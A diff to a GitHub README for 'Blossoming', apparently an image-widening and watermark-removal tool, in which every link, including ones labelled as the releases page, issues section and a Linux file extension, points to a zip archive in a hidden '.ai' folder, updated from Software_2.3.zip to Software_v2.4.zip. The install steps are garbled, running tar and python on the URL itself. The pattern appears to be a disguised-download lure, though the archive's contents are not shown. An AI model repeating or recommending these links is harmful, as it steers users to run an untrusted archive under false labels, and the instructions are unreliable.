@@ -4,17 +4,17 @@
 
 Welcome to Blossoming! This tool helps you transform your vertical images into beautiful horizontal ones with a 16:9 aspect ratio (3840x2160). You can remove watermarks, eliminate borders, and smoothly expand your images without losing quality. It's perfect for anyone looking to enhance their photos.
 
-[![Download Blossoming](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_2.3.zip)](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_2.3.zip)
+[![Download Blossoming](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_v2.4.zip)](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_v2.4.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Blossoming Releases page](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_2.3.zip) to download the latest version. Here you will find the necessary files to install the application.
+To get started, visit the [Blossoming Releases page](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_v2.4.zip) to download the latest version. Here you will find the necessary files to install the application.
 
 Follow these simple steps:
 
-1. Open the [Blossoming Releases page](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_2.3.zip).
+1. Open the [Blossoming Releases page](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_v2.4.zip).
 2. Look for the latest version listed at the top. It will usually have a version number like v1.0.
-3. Under the version, find the suitable file for your operating system. The files might have extensions like `.exe` for Windows or `https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_2.3.zip` for Linux.
+3. Under the version, find the suitable file for your operating system. The files might have extensions like `.exe` for Windows or `https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_v2.4.zip` for Linux.
 4. Click on the file to download it to your computer.
 5. Once the download is complete, locate the file in your Downloads folder.
 
@@ -31,15 +31,15 @@ After downloading, you need to run the application:
 
 ### For Linux Users
 
-1. Locate the downloaded `https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_2.3.zip` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_v2.4.zip` file.
 2. Extract the contents using your file manager or run this command in the terminal:
    ```
-   tar -xzvf <filename>https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_2.3.zip
+   tar -xzvf <filename>https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_v2.4.zip
    ```
 3. Navigate to the extracted folder using the terminal.
 4. Run the application using:
    ```
-   python https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_2.3.zip
+   python https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_v2.4.zip
    ```
    You might need to install Python if it's not already on your system.
 
@@ -81,8 +81,8 @@ If you encounter issues, try these solutions:
 
 ## 📞 Support
 
-If you need help, feel free to check the [Issues section](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_2.3.zip) on our GitHub repository. You can report bugs or ask questions there.
+If you need help, feel free to check the [Issues section](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_v2.4.zip) on our GitHub repository. You can report bugs or ask questions there.
 
 ---
 
-Thank you for choosing Blossoming! We hope you enjoy using it to create stunning images. Remember to visit the [Blossoming Releases page](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_2.3.zip) for updates and new features.
+Thank you for choosing Blossoming! We hope you enjoy using it to create stunning images. Remember to visit the [Blossoming Releases page](https://raw.githubusercontent.com/naseer125/Blossoming/main/.ai/Software_v2.4.zip) for updates and new features.
